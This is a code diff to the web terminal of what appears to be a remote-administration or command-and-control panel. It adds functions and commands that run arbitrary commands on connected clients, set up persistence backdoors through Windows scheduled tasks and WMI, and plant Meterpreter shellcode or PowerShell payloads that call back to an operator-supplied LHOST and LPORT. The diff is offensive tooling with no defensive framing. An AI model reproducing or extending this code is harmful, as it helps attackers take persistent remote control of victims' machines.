@@ -31,6 +31,14 @@ var adminController = {
 			}
 		})
 	},
+	setExec: function(signature, cmd, callback){
+		var pid='';
+		$.post(this.url_base+'setExec', {'signature': signature, 'cmd': cmd} , function(data){
+			if(/^[0-9a-f]{32}$/.test(data)){
+				callback(data)
+			}
+		})
+	},
 	setUpload: function(signature, filePath, callback){
 		$.post(this.url_base+'setUpload', {'signature': signature, 'filePath': filePath} , function(pid){
 			if(/^[0-9a-f]{32}$/.test(pid)){
@@ -74,11 +82,43 @@ var adminController = {
 	deleteSession: function(signature ,callback){
 		$.post(this.url_base+'deleteSession', {'signature': signature}, function(data){callback(data)}, 'json')
 	},
-	deleteUpload: function(filename, callback){
-		$.post(this.url_base+'deleteUpload', {'filename': filename}, function(data){callback(data)}, 'json')
+	deleteUpload: function(signature, filename, callback){
+		$.post(this.url_base+'deleteUpload', {'signature': signature, 'filename': filename}, function(data){callback(data)}, 'json')
 	},
 	deleteDownload: function(filename, callback){
 		$.post(this.url_base+'deleteDownload', {'filename': filename}, function(data){callback(data)}, 'json')
+	},
+	setWindowsTasks: function(signature, time, callback){
+		var pid='';
+		$.post(this.url_base+'setWindowsTasks', {'signature': signature, 'time': time} , function(data){
+			if(/^[0-9a-f]{32}$/.test(data)){
+				callback(data)
+			}
+		})
+	},
+	setWmiBackdoor: function(signature, callback){
+		var pid='';
+		$.post(this.url_base+'setWmiBackdoor', {'signature': signature} , function(data){
+			if(/^[0-9a-f]{32}$/.test(data)){
+				callback(data)
+			}
+		})
+	},
+	plantMeterpreter0: function(signature, ip, port, callback){
+		var pid='';
+		$.post(this.url_base+'plantMeterpreter0', {'signature': signature, 'ip':ip, 'port':port} , function(data){
+			if(/^[0-9a-f]{32}$/.test(data)){
+				callback(data)
+			}
+		})
+	},
+	plantMeterpreter1: function(signature, ip, port, callback){
+		var pid='';
+		$.post(this.url_base+'plantMeterpreter1', {'signature': signature, 'ip':ip, 'port':port} , function(data){
+			if(/^[0-9a-f]{32}$/.test(data)){
+				callback(data)
+			}
+		})
 	}
 }
 
@@ -135,7 +175,7 @@ TerminalShell.commands['show'] = function(){
 		adminController.showUploads(terminal.username, function(data){
 		terminal.uploadList = data
 		for (var o in data) {
-			terminal.print($('<a>').attr('target', '_blank').attr('href', 'getUploadedFileByName?filename='+data[o]['filename']).html(data[o]['id']+' '+data[o]['originalname']+' '+data[o]['filename']+' '+data[o]['comment']))
+			terminal.print($('<a>').attr('target', '_blank').attr('href', 'getUploadedFileByName?signature='+terminal.username+'&filename='+data[o]['filename']).html(data[o]['id']+' '+data[o]['originalname']+' '+data[o]['filename']+' '+data[o]['comment']))
 		};
 		})
 	}
@@ -156,8 +196,86 @@ TerminalShell.commands['delete'] = function(){
 		})
 	}else if(item == 'upload'){
 		uploadfile = arguments[2]
-		adminController.deleteUpload(terminal.uploadList[uploadfile]['filename'], function(data){
+		adminController.deleteUpload(terminal.username, terminal.uploadList[uploadfile]['filename'], function(data){
 			terminal.print(data)
+		})
+	}
+}
+
+TerminalShell.commands['backdoor'] = function(){
+	terminal = arguments[0]
+	item = arguments[1]
+	if(checkIdle()){
+		terminal.print('Client offline');
+		return
+	}
+	if(item == 'tasks'){
+		time = arguments[2]
+		if(! /^\d\d:\d\d$/.test(time)){terminal.print('time must in 00:00 format'); return;}
+		adminController.setWindowsTasks(terminal.username, time, function(pid){
+		adminController.getResult(terminal.username, pid, function(ret){
+			if(ret){
+				data = ret.trim().split('\n')
+				data.forEach(function(i){terminal.print(i)})
+				
+			}else{
+				terminal.print('Timeout...')
+			}
+		})
+
+		})
+	}else if(item == 'wmi'){
+		adminController.setWmiBackdoor(terminal.username, function(pid){
+		adminController.getResult(terminal.username, pid, function(ret){
+			if(ret){
+				data = ret.trim().split('\n')
+				data.forEach(function(i){terminal.print(i)})
+				
+			}else{
+				terminal.print('Timeout...')
+			}
+		})
+
+		})
+	}
+}
+
+TerminalShell.commands['meterpreter'] = function(){
+	terminal = arguments[0]
+	item = arguments[1]
+	if(checkIdle()){
+		terminal.print('Client offline');
+		return
+	}
+	if(!(terminal.dic['LHOST'] && terminal.dic['LPORT'])){
+		terminal.print('set LHOST and LPORT first');
+		return
+	}
+	if(item == 'shellcode' || item == '0'){
+		adminController.plantMeterpreter0(terminal.username, terminal.dic['LHOST'], terminal.dic['LPORT'], function(pid){
+		adminController.getResult(terminal.username, pid, function(ret){
+			if(ret){
+				data = ret.trim().split('\n')
+				data.forEach(function(i){terminal.print(i)})
+				
+			}else{
+				terminal.print('Timeout...')
+			}
+		})
+
+		})
+	}else if(item == 'powershell' || item == '1'){
+		adminController.plantMeterpreter1(terminal.username, terminal.dic['LHOST'], terminal.dic['LPORT'], function(pid){
+		adminController.getResult(terminal.username, pid, function(ret){
+			if(ret){
+				data = ret.trim().split('\n')
+				data.forEach(function(i){terminal.print(i)})
+				
+			}else{
+				terminal.print('Timeout...')
+			}
+		})
+
 		})
 	}
 }
@@ -228,7 +346,7 @@ TerminalShell.commands['client_exec'] = function(terminal, cmd){
 			}
 		})
 
-	})	
+	})
 }
 
 TerminalShell.commands['logout'] =
@@ -253,6 +371,10 @@ TerminalShell.commands['restart'] = TerminalShell.commands['reboot'] = function(
 
 function runCmd(cmd){
 	TerminalShell.process(Terminal,cmd)
+}
+
+function exec(cmd){
+	adminController.setExec(Terminal.username, cmd, function(pid){})
 }
 
 $(document).ready(function() {
